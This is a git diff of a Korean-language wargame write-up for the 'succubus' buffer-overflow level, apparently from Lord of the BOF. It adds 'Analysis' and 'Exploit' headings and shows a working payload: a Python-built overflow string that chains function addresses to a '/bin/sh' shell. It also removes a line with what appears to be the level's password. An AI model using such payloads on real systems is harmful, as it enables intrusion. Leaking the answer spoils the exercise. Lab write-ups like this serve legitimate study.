@@ -108,6 +108,10 @@ main(int argc, char *argv[])
 }
 ```
 
+-----
+
+### 0x01. Analysis
+
 \x40 주소가 필터링 되어 있어 라이브러리 주소를 사용하지못한다.
 
 ```c
@@ -252,12 +256,13 @@ payload 시나리오 :
 
 `|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xb8\xfa\xff\xbf|"/bin/sh"|`
 
-payload :
+-----
+
+### 0x02. Exploit
 
 ```sh
 ./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"\x90"*4+"\xb8\xfa\xff\xbf"+"/bin/sh"'`
 ```
 
+-----
 
-
-**succubus / hear to stay**
